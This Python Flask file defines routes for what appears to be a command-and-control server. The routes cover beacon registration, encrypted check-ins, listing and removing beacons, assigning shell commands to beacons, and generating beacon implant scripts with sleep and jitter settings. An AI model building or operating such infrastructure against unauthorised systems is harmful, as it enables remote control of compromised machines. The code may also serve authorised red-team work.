from flask import Blueprint, jsonify, request, session
from handlers.beacon_handler import (
    register_beacon, beacon_checkin, assign_task,
    get_beacons, get_beacon_detail, remove_beacon,
    generate_beacon_script
)

beacon_bp = Blueprint('beacon_routes', __name__)


from core.auth import login_required


@beacon_bp.route('/api/beacon/register', methods=['POST'])
def api_beacon_register():
    data = request.get_json(force=True)
    if not data:
        return jsonify({"status": "error", "message": "Invalid data."})
    result = register_beacon(data)
    return jsonify(result)


@beacon_bp.route('/api/beacon/checkin/<beacon_id>', methods=['POST'])
def api_beacon_checkin(beacon_id):
    encrypted_data = request.get_data(as_text=True)
    if not encrypted_data:
        return jsonify({"status": "error", "message": "No data."})
    result = beacon_checkin(beacon_id, encrypted_data)
    return jsonify(result)


@beacon_bp.route('/api/beacon/list', methods=['GET'])
@login_required
def api_beacon_list():
    return jsonify(get_beacons())


@beacon_bp.route('/api/beacon/detail', methods=['GET'])
@login_required
def api_beacon_detail():
    beacon_id = request.args.get('beacon_id', '')
    if not beacon_id:
        return jsonify({"status": "error", "message": "beacon_id required."})
    return jsonify(get_beacon_detail(beacon_id))


@beacon_bp.route('/api/beacon/remove', methods=['POST'])
@login_required
def api_beacon_remove():
    data = request.get_json()
    beacon_id = data.get('beacon_id', '')
    if not beacon_id:
        return jsonify({"status": "error", "message": "beacon_id required."})
    return jsonify(remove_beacon(beacon_id))


@beacon_bp.route('/api/beacon/task', methods=['POST'])
@login_required
def api_beacon_task():
    data = request.get_json()
    beacon_id = data.get('beacon_id', '')
    command = data.get('command', '')
    if not beacon_id or not command:
        return jsonify({"status": "error", "message": "beacon_id and command required."})
    return jsonify(assign_task(beacon_id, command))


@beacon_bp.route('/api/beacon/generate', methods=['POST'])
@login_required
def api_beacon_generate():
    data = request.get_json()
    listener_url = data.get('listener_url', '')
    sleep_sec = int(data.get('sleep', 5))
    jitter = int(data.get('jitter', 30))

    if not listener_url:
        return jsonify({"status": "error", "message": "listener_url required."})

    script = generate_beacon_script(listener_url, sleep_sec, jitter)
    return jsonify({
        "status": "success",
        "script": script,
        "listener_url": listener_url,
        "sleep": sleep_sec,
        "jitter": jitter
    })
